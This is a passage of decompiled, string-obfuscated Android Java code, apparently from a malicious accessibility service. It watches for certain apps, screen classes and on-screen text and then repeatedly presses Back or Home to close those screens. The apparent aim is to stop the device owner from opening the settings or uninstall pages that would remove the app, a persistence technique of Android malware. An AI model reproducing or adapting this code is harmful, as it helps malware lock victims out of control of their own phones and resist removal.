                } else if (System.currentTimeMillis() - q.f331b > 3800 && lowerCase2.contains($(2263, 2275, 1305))) {
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(1);
                    accessibilityService.performGlobalAction(2);
                    e.a($(2275, 2303, 6682));
                    return true;
                }
            }
            if (packageName != null) {
                if (className != null) {
                    if (e.contains(className.toString()) || (currentTimeMillis > c && f.contains(className.toString()))) {
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        e.a($(2375, 2406, 7100) + ((Object) packageName) + $3 + ((Object) className));
                        return true;
                    }
                    List<CharSequence> text2 = accessibilityEvent.getText();
                    StringBuilder sb2 = new StringBuilder();
                    if (text2 != null) {
                        for (CharSequence charSequence4 : text2) {
                            sb2.append(charSequence4);
                        }
                    }
                    String lowerCase3 = sb2.toString().toLowerCase();
                    if (className.equals($(2303, 2335, 9357)) && (lowerCase3.contains(lowerCase) || lowerCase3.contains(g.e()))) {
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        e.a($(2335, 2375, 1422));
                        return true;
                    }
                }
                if (className != null && packageName.equals($(2406, 2419, 9501)) && className.equals($(2419, 2439, 9022))) {
                    List<CharSequence> text3 = accessibilityEvent.getText();
                    StringBuilder sb3 = new StringBuilder();
                    if (text3 != null) {
                        for (CharSequence charSequence5 : text3) {
                            sb3.append(charSequence5);
                        }
                    }
                    if (sb3.toString().toLowerCase().contains(lowerCase.toLowerCase())) {
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        e.a($(2439, 2468, 1338));
                        return true;
                    }
                }
                boolean equals = packageName.equals($(2468, 2488, 5777));
                String $4 = $(2488, 2516, 7983);
                if (equals || packageName.equals($(2516, 2539, 4954)) || packageName.equals($4)) {
                    StringBuilder sb4 = new StringBuilder();
                    for (CharSequence charSequence6 : accessibilityEvent.getText()) {
                        sb4.append(charSequence6);
                    }
                    String lowerCase4 = sb4.toString().toLowerCase();
                    if (Build.VERSION.SDK_INT >= 30 && packageName.equals($4) && lowerCase4.length() > 100) {
                        return false;
                    }
                    if (lowerCase4.contains(lowerCase)) {
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        accessibilityService.performGlobalAction(1);
                        e.a($(2539, 2582, 9117));
                        return true;
                    }
                }
            }
        }
        return a(accessibilityService, accessibilityEvent);
    }
}
